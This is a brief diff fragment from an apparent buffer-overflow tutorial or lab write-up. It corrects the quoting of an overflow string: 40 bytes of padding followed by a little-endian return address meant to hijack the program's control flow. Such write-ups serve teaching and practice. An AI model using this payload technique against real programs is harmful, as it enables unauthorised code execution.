@@ -56,7 +56,7 @@ Overflow length will be 32 bytes(buffer) + 8 bytes (RBP) = 40 bytes.
 
 Therefore, the overflow strings will be:
 ```
-A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
+'A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
 ```
 Run the process with overflow strings:
 ```
